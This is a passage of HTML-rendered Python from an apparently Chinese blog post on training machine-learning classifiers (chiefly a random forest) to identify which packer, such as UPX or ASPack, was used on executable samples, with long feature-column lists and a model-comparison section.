class="string">"123"</span>,<span class="string">"124"</span>,<span class="string">"125"</span>,<span class="string">"126"</span>,<span class="string">"127"</span>,<span class="string">"128"</span>,<span class="string">"129"</span>,<span class="string">"130"</span>,<span class="string">"131"</span>,<span class="string">"132"</span>,<span class="string">"133"</span>,<span class="string">"134"</span>,<span class="string">"135"</span>,<span class="string">"136"</span>,<span class="string">"137"</span>,<span class="string">"138"</span>,<span class="string">"139"</span>,<span class="string">"140"</span>,<span class="string">"141"</span>,<span class="string">"142"</span>,<span class="string">"143"</span>,<span class="string">"144"</span>,<span class="string">"145"</span>,<span class="string">"146"</span>,<span class="string">"147"</span>,<span class="string">"148"</span>,<span class="string">"149"</span>,<span class="string">"150"</span>,<span class="string">"151"</span>,<span class="string">"152"</span>,<span class="string">"153"</span>,<span class="string">"154"</span>,<span class="string">"155"</span>,<span class="string">"156"</span>,<span class="string">"157"</span>,<span class="string">"158"</span>,<span class="string">"159"</span>,<span class="string">"160"</span>,<span class="string">"161"</span>,<span class="string">"162"</span>,<span class="string">"163"</span>,<span class="string">"164"</span>,<span class="string">"165"</span>,<span class="string">"166"</span>,<span class="string">"167"</span>,<span class="string">"168"</span>,<span class="string">"169"</span>,<span class="string">"170"</span>,<span class="string">"171"</span>,<span class="string">"172"</span>,<span class="string">"173"</span>,<span class="string">"174"</span>,<span class="string">"175"</span>,<span class="string">"176"</span>,<span class="string">"177"</span>,<span class="string">"178"</span>,<span class="string">"179"</span>,<span class="string">"180"</span>,<span class="string">"181"</span>,<span class="string">"182"</span>,<span class="string">"183"</span>,<span class="string">"184"</span>,<span class="string">"185"</span>,<span class="string">"186"</span>,<span class="string">"187"</span>,<span class="string">"188"</span>,<span class="string">"189"</span>,<span class="string">"190"</span>,<span class="string">"191"</span>,<span class="string">"192"</span>,<span class="string">"193"</span>,<span class="string">"194"</span>,<span class="string">"195"</span>,<span class="string">"196"</span>,<span class="string">"197"</span>,<span class="string">"198"</span>,<span class="string">"199"</span>,<span class="string">"200"</span>,<span class="string">"201"</span>,<span class="string">"202"</span>,<span class="string">"203"</span>,<span class="string">"204"</span>,<span class="string">"205"</span>,<span class="string">"206"</span>,<span class="string">"207"</span>,<span class="string">"208"</span>,<span class="string">"209"</span>,<span class="string">"210"</span>,<span class="string">"211"</span>,<span class="string">"212"</span>,<span class="string">"213"</span>,<span class="string">"214"</span>,<span class="string">"215"</span>,<span class="string">"216"</span>,<span class="string">"217"</span>,<span class="string">"218"</span>,<span class="string">"219"</span>,<span class="string">"220"</span>,<span class="string">"221"</span>,<span class="string">"222"</span>,<span class="string">"223"</span>,<span class="string">"224"</span>,<span class="string">"225"</span>,<span class="string">"226"</span>,<span class="string">"227"</span>,<span class="string">"228"</span>,<span class="string">"229"</span>,<span class="string">"230"</span>,<span class="string">"231"</span>,<span class="string">"232"</span>,<span class="string">"233"</span>,<span class="string">"234"</span>,<span class="string">"235"</span>,<span class="string">"236"</span>,<span class="string">"237"</span>,<span class="string">"238"</span>,<span class="string">"239"</span>,<span class="string">"240"</span>,<span class="string">"241"</span>,<span class="string">"242"</span>,<span class="string">"243"</span>,<span class="string">"244"</span>,<span class="string">"245"</span>,<span class="string">"246"</span>,<span class="string">"247"</span>,<span class="string">"248"</span>,<span class="string">"249"</span>,<span class="string">"250"</span>,<span class="string">"251"</span>,<span class="string">"252"</span>,<span class="string">"253"</span>,<span class="string">"254"</span>,<span class="string">"255"</span>,<span class="string">"256"</span>,<span class="string">"257"</span>,<span class="string">"258"</span>,<span class="string">"259"</span>,<span class="string">"260"</span>,<span class="string">"261"</span>,<span class="string">"262"</span>,<span class="string">"263"</span>,<span class="string">"264"</span>,<span class="string">"265"</span>,<span class="string">"266"</span>,<span class="string">"267"</span>,<span class="string">"268"</span>,<span class="string">"269"</span>,<span class="string">"270"</span>,<span class="string">"271"</span>,<span class="string">"272"</span>,<span class="string">"273"</span>,<span class="string">"274"</span>,<span class="string">"275"</span>,<span class="string">"276"</span>,<span class="string">"277"</span>,<span class="string">"278"</span>,<span class="string">"279"</span>,<span class="string">"280"</span>,<span class="string">"281"</span>,<span class="string">"282"</span>,<span class="string">"283"</span>,<span class="string">"284"</span>,<span class="string">"285"</span>,<span class="string">"286"</span>,<span class="string">"287"</span>,<span class="string">"288"</span>,<span class="string">"289"</span>,<span class="string">"290"</span>,<span class="string">"291"</span>,<span class="string">"292"</span>,<span class="string">"293"</span>,<span class="string">"294"</span>,<span class="string">"295"</span>,<span class="string">"296"</span>,<span class="string">"297"</span>,<span class="string">"298"</span>,<span class="string">"299"</span>,<span class="string">"300"</span>,<span class="string">"301"</span>,<span class="string">"302"</span>,<span class="string">"303"</span>,<span class="string">"304"</span>,<span class="string">"305"</span>,<span class="string">"306"</span>,<span class="string">"307"</span>,<span class="string">"308"</span>,<span class="string">"309"</span>,<span class="string">"310"</span>,<span class="string">"311"</span>,<span class="string">"312"</span>,<span class="string">"313"</span>,<span class="string">"314"</span>,<span class="string">"315"</span>,<span class="string">"316"</span>,<span class="string">"317"</span>,<span class="string">"318"</span>,<span class="string">"319"</span>,<span class="string">"320"</span>,<span class="string">"321"</span>,<span class="string">"322"</span>,<span class="string">"323"</span>,<span class="string">"324"</span>,<span class="string">"325"</span>,<span class="string">"326"</span>,<span class="string">"327"</span>,<span class="string">"328"</span>,<span class="string">"329"</span>,<span class="string">"330"</span>,<span class="string">"331"</span>,<span class="string">"332"</span>,<span class="string">"333"</span>,<span class="string">"334"</span>,<span class="string">"335"</span>,<span class="string">"336"</span>,<span class="string">"337"</span>,<span class="string">"338"</span>,<span class="string">"339"</span>,<span class="string">"340"</span>,<span class="string">"341"</span>,<span class="string">"342"</span>,<span class="string">"343"</span>,<span class="string">"344"</span>,<span class="string">"345"</span>,<span class="string">"346"</span>,<span class="string">"347"</span>,<span class="string">"348"</span>,<span class="string">"349"</span>,<span class="string">"350"</span>,<span class="string">"351"</span>,<span class="string">"352"</span>,<span class="string">"353"</span>,<span class="string">"354"</span>,<span class="string">"355"</span>,<span class="string">"356"</span>,<span class="string">"357"</span>,<span class="string">"358"</span>,<span class="string">"359"</span>,<span class="string">"360"</span>,<span class="string">"361"</span>,<span class="string">"362"</span>,<span class="string">"363"</span>,<span class="string">"364"</span>,<span class="string">"365"</span>,<span class="string">"366"</span>,<span class="string">"367"</span>,<span class="string">"368"</span>,<span class="string">"369"</span>,<span class="string">"370"</span>,<span class="string">"371"</span>,<span class="string">"372"</span>,<span class="string">"373"</span>,<span class="string">"374"</span>,<span class="string">"375"</span>,<span class="string">"376"</span>,<span class="string">"377"</span>,<span class="string">"378"</span>,<span class="string">"379"</span>,<span class="string">"380"</span>,<span class="string">"381"</span>,<span class="string">"382"</span>,<span class="string">"383"</span>,<span class="string">"384"</span>,<span class="string">"385"</span>,<span class="string">"386"</span>,<span class="string">"387"</span>,<span class="string">"388"</span>,<span class="string">"389"</span>,<span class="string">"390"</span>,<span class="string">"391"</span>,<span class="string">"392"</span>,<span class="string">"393"</span>,<span class="string">"394"</span>,<span class="string">"395"</span>,<span class="string">"396"</span>,<span class="string">"397"</span>,<span class="string">"398"</span>,<span class="string">"399"</span>,<span class="string">"400"</span>,<span class="string">"401"</span>,<span class="string">"402"</span>,<span class="string">"403"</span>,<span class="string">"404"</span>,<span class="string">"405"</span>,<span class="string">"406"</span>,<span class="string">"407"</span>,<span class="string">"408"</span>,<span class="string">"409"</span>,<span class="string">"410"</span>,<span class="string">"411"</span>,<span class="string">"412"</span>,<span class="string">"413"</span>,<span class="string">"414"</span>,<span class="string">"415"</span>,<span class="string">"416"</span>,<span class="string">"417"</span>,<span class="string">"418"</span>,<span class="string">"419"</span>,<span class="string">"420"</span>,<span class="string">"421"</span>,<span class="string">"422"</span>,<span class="string">"423"</span>,<span class="string">"424"</span>,<span class="string">"425"</span>,<span class="string">"426"</span>,<span class="string">"427"</span>,<span class="string">"428"</span>,<span class="string">"429"</span>,<span class="string">"430"</span>,<span class="string">"431"</span>,<span class="string">"432"</span>,<span class="string">"433"</span>,<span class="string">"434"</span>,<span class="string">"435"</span>,<span class="string">"436"</span>,<span class="string">"437"</span>,<span class="string">"438"</span>,<span class="string">"439"</span>,<span class="string">"440"</span>,<span class="string">"441"</span>,<span class="string">"442"</span>,<span class="string">"443"</span>,<span class="string">"444"</span>,<span class="string">"445"</span>,<span class="string">"446"</span>,<span class="string">"447"</span>,<span class="string">"448"</span>,<span class="string">"449"</span>,<span class="string">"450"</span>,<span class="string">"451"</span>,<span class="string">"452"</span>,<span class="string">"453"</span>,<span class="string">"454"</span>,<span class="string">"455"</span>,<span class="string">"456"</span>,<span class="string">"457"</span>,<span class="string">"458"</span>,<span class="string">"459"</span>,<span class="string">"460"</span>,<span class="string">"461"</span>,<span class="string">"462"</span>,<span class="string">"463"</span>,<span class="string">"464"</span>,<span class="string">"465"</span>,<span class="string">"466"</span>,<span class="string">"467"</span>,<span class="string">"468"</span>,<span class="string">"469"</span>,<span class="string">"470"</span>,<span class="string">"471"</span>,<span class="string">"472"</span>,<span class="string">"473"</span>,<span class="string">"474"</span>,<span class="string">"475"</span>,<span class="string">"476"</span>,<span class="string">"477"</span>,<span class="string">"478"</span>,<span class="string">"479"</span>,<span class="string">"480"</span>,<span class="string">"481"</span>,<span class="string">"482"</span>,<span class="string">"483"</span>,<span class="string">"484"</span>,<span class="string">"485"</span>,<span class="string">"486"</span>]  <span class="comment"># 特征值命名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(dataset)</span></span><br><span class="line"></span><br><span class="line">x = dataset[[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">"10"</span>,<span class="string">"11"</span>,<span class="string">"332"</span>,<span class="string">"333"</span>,<span class="string">"334"</span>,<span class="string">"335"</span>,<span class="string">"336"</span>,<span class="string">"337"</span>,<span class="string">"338"</span>,<span class="string">"339"</span>,<span class="string">"340"</span>,<span class="string">"341"</span>,</span><br><span class="line">             <span class="string">"342"</span>,<span class="string">"343"</span>,<span class="string">"344"</span>,<span class="string">"345"</span>,<span class="string">"346"</span>,<span class="string">"347"</span>,<span class="string">"348"</span>,<span class="string">"349"</span>,<span class="string">"350"</span>,<span class="string">"351"</span>,<span class="string">"352"</span>,<span class="string">"353"</span>,<span class="string">"354"</span>,<span class="string">"355"</span>,<span class="string">"356"</span>,<span class="string">"357"</span>,<span class="string">"358"</span>,<span class="string">"359"</span>,<span class="string">"360"</span>,<span class="string">"361"</span>,</span><br><span class="line">             <span class="string">"362"</span>,<span class="string">"363"</span>,<span class="string">"364"</span>,<span class="string">"365"</span>,<span class="string">"366"</span>,<span class="string">"367"</span>,<span class="string">"368"</span>,<span class="string">"369"</span>,<span class="string">"370"</span>,<span class="string">"371"</span>,<span class="string">"372"</span>,<span class="string">"373"</span>,<span class="string">"374"</span>,<span class="string">"375"</span>,<span class="string">"376"</span>,<span class="string">"377"</span>,<span class="string">"378"</span>,<span class="string">"379"</span>,<span class="string">"380"</span>,<span class="string">"381"</span>,</span><br><span class="line">             <span class="string">"382"</span>,<span class="string">"383"</span>,<span class="string">"384"</span>,<span class="string">"385"</span>,<span class="string">"386"</span>,<span class="string">"387"</span>,<span class="string">"388"</span>,<span class="string">"389"</span>,<span class="string">"390"</span>,<span class="string">"391"</span>,<span class="string">"392"</span>,<span class="string">"393"</span>,<span class="string">"394"</span>,<span class="string">"395"</span>,<span class="string">"396"</span>,<span class="string">"397"</span>,<span class="string">"398"</span>,<span class="string">"399"</span>,<span class="string">"400"</span>,<span class="string">"401"</span>,</span><br><span class="line">             <span class="string">"402"</span>,<span class="string">"403"</span>,<span class="string">"404"</span>,<span class="string">"405"</span>,<span class="string">"406"</span>,<span class="string">"407"</span>,<span class="string">"408"</span>,<span class="string">"409"</span>,<span class="string">"410"</span>,<span class="string">"411"</span>,<span class="string">"412"</span>,<span class="string">"413"</span>,<span class="string">"414"</span>,<span class="string">"415"</span>,<span class="string">"416"</span>,<span class="string">"417"</span>,<span class="string">"418"</span>,<span class="string">"419"</span>,<span class="string">"420"</span>,<span class="string">"421"</span>,</span><br><span class="line">             <span class="string">"422"</span>,<span class="string">"423"</span>,<span class="string">"424"</span>,<span class="string">"425"</span>,<span class="string">"426"</span>,<span class="string">"427"</span>,<span class="string">"428"</span>,<span class="string">"429"</span>,<span class="string">"430"</span>,<span class="string">"431"</span>,<span class="string">"432"</span>,<span class="string">"433"</span>,<span class="string">"434"</span>,<span class="string">"435"</span>,<span class="string">"436"</span>,<span class="string">"437"</span>,<span class="string">"438"</span>,<span class="string">"439"</span>,<span class="string">"440"</span>,<span class="string">"441"</span>,</span><br><span class="line">             <span class="string">"442"</span>,<span class="string">"443"</span>,<span class="string">"444"</span>,<span class="string">"445"</span>,<span class="string">"446"</span>,<span class="string">"447"</span>,<span class="string">"448"</span>,<span class="string">"449"</span>,<span class="string">"450"</span>,<span class="string">"451"</span>,<span class="string">"452"</span>,<span class="string">"453"</span>,<span class="string">"454"</span>,<span class="string">"455"</span>,<span class="string">"456"</span>,<span class="string">"457"</span>,<span class="string">"458"</span>,<span class="string">"459"</span>,<span class="string">"460"</span>,<span class="string">"461"</span>,</span><br><span class="line">             <span class="string">"462"</span>,<span class="string">"463"</span>,<span class="string">"464"</span>,<span class="string">"465"</span>,<span class="string">"466"</span>,<span class="string">"467"</span>,<span class="string">"468"</span>,<span class="string">"469"</span>,<span class="string">"470"</span>,<span class="string">"471"</span>,<span class="string">"472"</span>,<span class="string">"473"</span>,<span class="string">"474"</span>,<span class="string">"475"</span>,<span class="string">"476"</span>,<span class="string">"477"</span>,<span class="string">"478"</span>,<span class="string">"479"</span>,<span class="string">"480"</span>,<span class="string">"481"</span>,<span class="string">"482"</span>,<span class="string">"483"</span>,<span class="string">"484"</span>,<span class="string">"485"</span>,<span class="string">"486"</span>]]</span><br><span class="line"></span><br><span class="line">y = dataset[<span class="string">'type'</span>] <span class="comment">#把标签和前面的特征分开','x作为特征','y作为相应的标签</span></span><br><span class="line">print(x.shape)  <span class="comment">#数据量 几条数据 , 几个特征</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.数据预处理：训练集测试集分割，数据标准化</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(x, y, test_size = <span class="number">0.2</span>,random_state = <span class="number">35</span>) <span class="comment"># 训练测试数据集分割(特征, 标签, 测试集大小)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型实例化</span></span><br><span class="line">rfc = RandomForestClassifier(n_estimators=<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入数据训练</span></span><br><span class="line">rfc = rfc.fit(x_train,y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取分数</span></span><br><span class="line">score_r = rfc.score(x_test,y_test)</span><br><span class="line"></span><br><span class="line">y_predict_r = rfc.predict(x_test)</span><br><span class="line">print(<span class="string">"Random Forest:&#123;&#125;"</span>.format(score_r))</span><br><span class="line">print(<span class="string">"Random Forest:"</span>,classification_report(y_predict_r,y_test,target_names=[<span class="string">'UPX'</span>,<span class="string">'ASpack'</span>,<span class="string">'NSpack'</span>,<span class="string">'PEcompact'</span>,<span class="string">'FSG'</span>,<span class="string">'ASProtect'</span>,<span class="string">'Petite'</span>,<span class="string">'Unpacked'</span>]))</span><br><span class="line"></span><br><span class="line">joblib.dump(rfc,<span class="string">'/Volumes/Samsung_T5/malware samples/results/rfc.model'</span>) <span class="comment">#保存训练好的模型</span></span><br></pre></td></tr></table></figure><h3 id="cross-test-交叉训练"><a href="#cross-test-交叉训练" class="headerlink" title="cross_test 交叉训练"></a>cross_test 交叉训练</h3><p>交叉训练, 对比<code>ANN</code>\ <code>DecisionTress</code>\ <code>RandomForest</code>\ <code>SVC</code>算法的准确率. 共测试200次, 得到实验结果图. 选择准确率较高的 <code>RandomForest</code> 作为最后的算法</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="built_in">import</span> pandas as pd</span><br><span class="line">from sklearn.model_selection <span class="built_in">import</span> cross_val_score</span><br><span class="line"><span class="built_in">import</span> matplotlib.pyplot as plt</span><br><span class="line">from sklearn.tree <span class="built_in">import</span> DecisionTreeClassifier</span><br><span class="line">from sklearn.ensemble <span class="built_in">import</span> RandomForestClassifier</span><br><span class="line">from sklearn.neural_network <span class="built_in">import</span> MLPClassifier</span><br><span class="line">from sklearn.svm <span class="built_in">import</span> SVC</span><br><span class="line">from sklearn.naive_bayes <span class="built_in">import</span> MultinomialNB</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.数据获取</span></span><br><span class="line"><span class="attr">dataset=pd.read_csv('/Volumes/Samsung_T5/malware</span> samples/data/data-<span class="number">2000</span>.csv',<span class="attr">sep</span> = ',', <span class="attr">header</span> = None)</span><br><span class="line">dataset.<span class="attr">columns</span> = [<span class="string">"type"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">"10"</span>,<span class="string">"11"</span>,<span class="string">"12"</span>,<span class="string">"13"</span>,<span class="string">"14"</span>,<span class="string">"15"</span>,<span class="string">"16"</span>,<span class="string">"17"</span>,<span class="string">"18"</span>,<span class="string">"19"</span>,<span class="string">"20"</span>,<span class="string">"21"</span>,<span class="string">"22"</span>,<span class="string">"23"</span>,<span class="string">"24"</span>,<span class="string">"25"</span>,<span class="string">"26"</span>,<span class="string">"27"</span>,<span class="string">"28"</span>,<span class="string">"29"</span>,<span class="string">"30"</span>,<span class="string">"31"</span>,<span class="string">"32"</span>,<span class="string">"33"</span>,<span class="string">"34"</span>,<span class="string">"35"</span>,<span class="string">"36"</span>,<span class="string">"37"</span>,<span class="string">"38"</span>,<span class="string">"39"</span>,<span class="string">"40"</span>,<span class="string">"41"</span>,<span class="string">"42"</span>,<span class="string">"43"</span>,<span class="string">"44"</span>,<span class="string">"45"</span>,<span class="string">"46"</span>,<span class="string">"47"</span>,<span class="string">"48"</span>,<span class="string">"49"</span>,<span class="string">"50"</span>,<span class="string">"51"</span>,<span class="string">"52"</span>,<span class="string">"53"</span>,<span class="string">"54"</span>,<span class="string">"55"</span>,<span class="string">"56"</span>,<span class="string">"57"</span>,<span class="string">"58"</span>,<span class="string">"59"</span>,<span class="string">"60"</span>,<span class="string">"61"</span>,<span class="string">"62"</span>,<span class="string">"63"</span>,<span class="string">"64"</span>,<span class="string">"65"</span>,<span class="string">"66"</span>,<span class="string">"67"</span>,<span class="string">"68"</span>,<span class="string">"69"</span>,<span class="string">"70"</span>,<span class="string">"71"</span>,<span class="string">"72"</span>,<span class="string">"73"</span>,<span class="string">"74"</span>,<span class="string">"75"</span>,<span class="string">"76"</span>,<span class="string">"77"</span>,<span class="string">"78"</span>,<span class="string">"79"</span>,<span class="string">"80"</span>,<span class="string">"81"</span>,<span class="string">"82"</span>,<span class="string">"83"</span>,<span class="string">"84"</span>,<span class="string">"85"</span>,<span class="string">"86"</span>,<span class="string">"87"</span>,<span class="string">"88"</span>,<span class="string">"89"</span>,<span class="string">"90"</span>,<span class="string">"91"</span>,<span class="string">"92"</span>,<span class="string">"93"</span>,<span class="string">"94"</span>,<span class="string">"95"</span>,<span class="string">"96"</span>,<span class="string">"97"</span>,<span class="string">"98"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"101"</span>,<span class="string">"102"</span>,<span class="string">"103"</span>,<span class="string">"104"</span>,<span class="string">"105"</span>,<span class="string">"106"</span>,<span class="string">"107"</span>,<span class="string">"108"</span>,<span class="string">"109"</span>,<span class="string">"110"</span>,<span class="string">"111"</span>,<span class="string">"112"</span>,<span class="string">"113"</span>,<span class="string">"114"</span>,<span class="string">"115"</span>,<span class="string">"116"</span>,<span class="string">"117"</span>,<span class="string">"118"</span>,<span class="string">"119"</span>,<span class="string">"120"</span>,<span class="string">"121"</span>,<span class="string">"122"</span>,<span class="string">"123"</span>,<span class="string">"124"</span>,<span class="string">"125"</span>,<span class="string">"126"</span>,<span class="string">"127"</span>,<span class="string">"128"</span>,<span class="string">"129"</span>,<span class="string">"130"</span>,<span class="string">"131"</span>,<span class="string">"132"</span>,<span class="string">"133"</span>,<span class="string">"134"</span>,<span class="string">"135"</span>,<span class="string">"136"</span>,<span class="string">"137"</span>,<span class="string">"138"</span>,<span class="string">"139"</span>,<span class="string">"140"</span>,<span class="string">"141"</span>,<span class="string">"142"</span>,<span class="string">"143"</span>,<span class="string">"144"</span>,<span class="string">"145"</span>,<span class="string">"146"</span>,<span class="string">"147"</span>,<span class="string">"148"</span>,<span class="string">"149"</span>,<span class="string">"150"</span>,<span class="string">"151"</span>,<span class="string">"152"</span>,<span class="string">"153"</span>,<span class="string">"154"</span>,<span class="string">"155"</span>,<span class="string">"156"</span>,<span class="string">"157"</span>,<span class="string">"158"</span>,<span class="string">"159"</span>,<span class="string">"160"</span>,<span class="string">"161"</span>,<span class="string">"162"</span>,<span class="string">"163"</span>,<span class="string">"164"</span>,<span class="string">"165"</span>,<span class="string">"166"</span>,<span class="string">"167"</span>,<span class="string">"168"</span>,<span class="string">"169"</span>,<span class="string">"170"</span>,<span class="string">"171"</span>,<span class="string">"172"</span>,<span class="string">"173"</span>,<span class="string">"174"</span>,<span class="string">"175"</span>,<span class="string">"176"</span>,<span class="string">"177"</span>,<span class="string">"178"</span>,<span class="string">"179"</span>,<span class="string">"180"</span>,<span class="string">"181"</span>,<span class="string">"182"</span>,<span class="string">"183"</span>,<span class="string">"184"</span>,<span class="string">"185"</span>,<span class="string">"186"</span>,<span class="string">"187"</span>,<span class="string">"188"</span>,<span class="string">"189"</span>,<span class="string">"190"</span>,<span class="string">"191"</span>,<span class="string">"192"</span>,<span class="string">"193"</span>,<span class="string">"194"</span>,<span class="string">"195"</span>,<span class="string">"196"</span>,<span class="string">"197"</span>,<span class="string">"198"</span>,<span class="string">"199"</span>,<span class="string">"200"</span>,<span class="string">"201"</span>,<span class="string">"202"</span>,<span class="string">"203"</span>,<span class="string">"204"</span>,<span class="string">"205"</span>,<span class="string">"206"</span>,<span class="string">"207"</span>,<span class="string">"208"</span>,<span class="string">"209"</span>,<span class="string">"210"</span>,<span class="string">"211"</span>,<span class="string">"212"</span>,<span class="string">"213"</span>,<span class="string">"214"</span>,<span class="string">"215"</span>,<span class="string">"216"</span>,<span class="string">"217"</span>,<span class="string">"218"</span>,<span class="string">"219"</span>,<span class="string">"220"</span>,<span class="string">"221"</span>,<span class="string">"222"</span>,<span class="string">"223"</span>,<span class="string">"224"</span>,<span class="string">"225"</span>,<span class="string">"226"</span>,<span class="string">"227"</span>,<span class="string">"228"</span>,<span class="string">"229"</span>,<span class="string">"230"</span>,<span class="string">"231"</span>,<span class="string">"232"</span>,<span class="string">"233"</span>,<span class="string">"234"</span>,<span class="string">"235"</span>,<span class="string">"236"</span>,<span class="string">"237"</span>,<span class="string">"238"</span>,<span class="string">"239"</span>,<span class="string">"240"</span>,<span class="string">"241"</span>,<span class="string">"242"</span>,<span class="string">"243"</span>,<span class="string">"244"</span>,<span class="string">"245"</span>,<span class="string">"246"</span>,<span class="string">"247"</span>,<span class="string">"248"</span>,<span class="string">"249"</span>,<span class="string">"250"</span>,<span class="string">"251"</span>,<span class="string">"252"</span>,<span class="string">"253"</span>,<span class="string">"254"</span>,<span class="string">"255"</span>,<span class="string">"256"</span>,<span class="string">"257"</span>,<span class="string">"258"</span>,<span class="string">"259"</span>,<span class="string">"260"</span>,<span class="string">"261"</span>,<span class="string">"262"</span>,<span class="string">"263"</span>,<span class="string">"264"</span>,<span class="string">"265"</span>,<span class="string">"266"</span>,<span class="string">"267"</span>,<span class="string">"268"</span>,<span class="string">"269"</span>,<span class="string">"270"</span>,<span class="string">"271"</span>,<span class="string">"272"</span>,<span class="string">"273"</span>,<span class="string">"274"</span>,<span class="string">"275"</span>,<span class="string">"276"</span>,<span class="string">"277"</span>,<span class="string">"278"</span>,<span class="string">"279"</span>,<span class="string">"280"</span>,<span class="string">"281"</span>,<span class="string">"282"</span>,<span class="string">"283"</span>,<span class="string">"284"</span>,<span class="string">"285"</span>,<span class="string">"286"</span>,<span class="string">"287"</span>,<span class="string">"288"</span>,<span class="string">"289"</span>,<span class="string">"290"</span>,<span class="string">"291"</span>,<span class="string">"292"</span>,<span class="string">"293"</span>,<span class="string">"294"</span>,<span class="string">"295"</span>,<span class="string">"296"</span>,<span class="string">"297"</span>,<span class="string">"298"</span>,<span class="string">"299"</span>,<span class="string">"300"</span>,<span class="string">"301"</span>,<span class="string">"302"</span>,<span class="string">"303"</span>,<span class="string">"304"</span>,<span class="string">"305"</span>,<span class="string">"306"</span>,<span class="string">"307"</span>,<span class="string">"308"</span>,<span class="string">"309"</span>,<span class="string">"310"</span>,<span class="string">"311"</span>,<span class="string">"312"</span>,<span class="string">"313"</span>,<span class="string">"314"</span>,<span class="string">"315"</span>,<span class="string">"316"</span>,<span class="string">"317"</span>,<span class="string">"318"</span>,<span class="string">"319"</span>,<span class="string">"320"</span>,<span class="string">"321"</span>,<span class="string">"322"</span>,<span class="string">"323"</span>,<span class="string">"324"</span>,<span class="string">"325"</span>,<span class="string">"326"</span>,<span class="string">"327"</span>,<span class="string">"328"</span>,<span class="string">"329"</span>,<span class="string">"330"</span>,<span class="string">"331"</span>,<span class="string">"332"</span>,<span class="string">"333"</span>,<span class="string">"334"</span>,<span class="string">"335"</span>,<span class="string">"336"</span>,<span class="string">"337"</span>,<span class="string">"338"</span>,<span class="string">"339"</span>,<span class="string">"340"</span>,<span class="string">"341"</span>,<span class="string">"342"</span>,<span class="string">"343"</span>,<span class="string">"344"</span>,<span class="string">"345"</span>,<span class="string">"346"</span>,<span class="string">"347"</span>,<span class="string">"348"</span>,<span class="string">"349"</span>,<span class="string">"350"</span>,<span class="string">"351"</span>,<span class="string">"352"</span>,<span class="string">"353"</span>,<span class="string">"354"</span>,<span class="string">"355"</span>,<span class="string">"356"</span>,<span class="string">"357"</span>,<span class="string">"358"</span>,<span class="string">"359"</span>,<span class="string">"360"</span>,<span class="string">"361"</span>,<span class="string">"362"</span>,<span class="string">"363"</span>,<span class="string">"364"</span>,<span class="string">"365"</span>,<span class="string">"366"</span>,<span class="string">"367"</span>,<span class="string">"368"</span>,<span class="string">"369"</span>,<span class="string">"370"</span>,<span class="string">"371"</span>,<span class="string">"372"</span>,<span class="string">"373"</span>,<span class="string">"374"</span>,<span class="string">"375"</span>,<span class="string">"376"</span>,<span class="string">"377"</span>,<span class="string">"378"</span>,<span class="string">"379"</span>,<span class="string">"380"</span>,<span class="string">"381"</span>,<span class="string">"382"</span>,<span class="string">"383"</span>,<span class="string">"384"</span>,<span class="string">"385"</span>,<span class="string">"386"</span>,<span class="string">"387"</span>,<span class="string">"388"</span>,<span class="string">"389"</span>,<span class="string">"390"</span>,<span class="string">"391"</span>,<span class="string">"392"</span>,<span class="string">"393"</span>,<span class="string">"394"</span>,<span class="string">"395"</span>,<span class="string">"396"</span>,<span class="string">"397"</span>,<span class="string">"398"</span>,<span class="string">"399"</span>,<span class="string">"400"</span>,<span class="string">"401"</span>,<span class="string">"402"</span>,<span class="string">"403"</span>,<span class="string">"404"</span>,<span class="string">"405"</span>,<span class="string">"406"</span>,<span class="string">"407"</span>,<span class="string">"408"</span>,<span class="string">"409"</span>,<span class="string">"410"</span>,<span class="string">"411"</span>,<span class="string">"412"</span>,<span class="string">"413"</span>,<span class="string">"414"</span>,<span class="string">"415"</span>,<span class="string">"416"</span>,<span class="string">"417"</span>,<span class="string">"418"</span>,<span class="string">"419"</span>,<span class="string">"420"</span>,<span class="string">"421"</span>,<span class="string">"422"</span>,<span class="string">"423"</span>,<span class="string">"424"</span>,<span class="string">"425"</span>,<span class="string">"426"</span>,<span class="string">"427"</span>,<span class="string">"428"</span>,<span class="string">"429"</span>,<span class="string">"430"</span>,<span class="string">"431"</span>,<span class="string">"432"</span>,<span class="string">"433"</span>,<span class="string">"434"</span>,<span class="string">"435"</span>,<span class="string">"436"</span>,<span 